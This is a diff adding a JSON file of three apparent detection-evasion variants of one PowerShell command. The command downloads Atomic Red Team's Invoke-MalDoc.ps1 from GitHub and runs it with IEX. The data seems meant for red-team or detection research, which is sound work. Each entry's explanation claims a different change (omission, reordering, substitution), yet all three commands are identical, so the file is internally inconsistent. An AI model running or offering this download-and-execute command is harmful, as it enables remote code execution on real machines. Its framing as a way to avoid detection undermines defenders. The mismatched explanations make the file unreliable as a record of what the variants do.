@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing)\"",
+    "explanation": "Omission: Removed the file reading and macro code injection parts, keeping the inline execution but without the file interaction."
+  },
+  {
+    "output": "powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing)\"",
+    "explanation": "Reordering: The command is reordered to start with the security protocol setting and inline execution, potentially avoiding detection by the order of operations."
+  },
+  {
+    "output": "powershell.exe -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1' -UseBasicParsing)\"",
+    "explanation": "Substitution: Replaced the original command with a simplified version that still performs inline execution but omits the file reading and macro code injection parts."
+  }
+]
